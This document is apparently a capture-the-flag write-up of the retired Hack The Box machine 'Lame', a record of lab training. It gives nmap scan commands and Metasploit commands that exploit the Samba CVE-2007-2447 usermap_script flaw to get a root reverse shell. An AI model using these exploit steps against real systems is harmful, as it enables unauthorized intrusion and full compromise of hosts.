Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**
2. Scan for **services** in these open ports
3. Scan for **vulnerabilities** in these services

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.10.3 -p- -T4 --min-rate 5000 -oG all_ports.txt --open -n -Pn
```

<br />
<br />
<br />

There are **5 open ports**:
+ **21/tcp**
+ **22/tcp**
+ **139/tcp**
+ **445/tcp**
+ **3632/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.3 -p 21,22,139,445,3632 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A -v
```

![Services Scan](/assets/Lame/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **21/tcp vsftpd 2.3.4**
+ **22/tcp OpenSSH 4.7p1**
+ **139/tcp Samba smbd 3.X - 4.X**
+ **445/tcp Samba smbd 3.0.20**
+ **3632/tcp distccd v1 4.2.4**

<br />

Now we will seek for **vulnerabilities**, however the scan didn't return any useful information.

### Foothold

This machine was **quite realistic** for one reason, **everything was vulnerable**:
+ The version of **FTP** allowed an **RCE**, however it was **patched**.
+ The version of **OpenSSH** allowed **user enumeration**, and it allowed me to do so, however it didn't return any useful information.
+ The version of **Samba** allowed a **buffer overflow**, and it allowed me to hack into the machine.
+ **DistCC daemon** should have allowed an **RCE**, however it was **patched**.

<br />

I tried every possible working exploit until I found the **Samba** one, which casually was the latest one. The exploit leverages **CVE-2007-2447**, although I found a script from the repository of **un4gi**, it did not work for me, however I encourage everyone to try it as the other tool we can use is **Metasploit**.

We can run Metasploit and configure it by running the following commands:

```bash
sudo msfdb run
use exploit/multi/samba/usermap_script
set lhost tun0
set rhost 10.10.10.3
run
```

We should be now logged in as the **root user**:

<br />
<br />
<br />

We can **sanitize the shell** and then print the **flags**:

```bash
script /dev/null -c /bin/bash
```
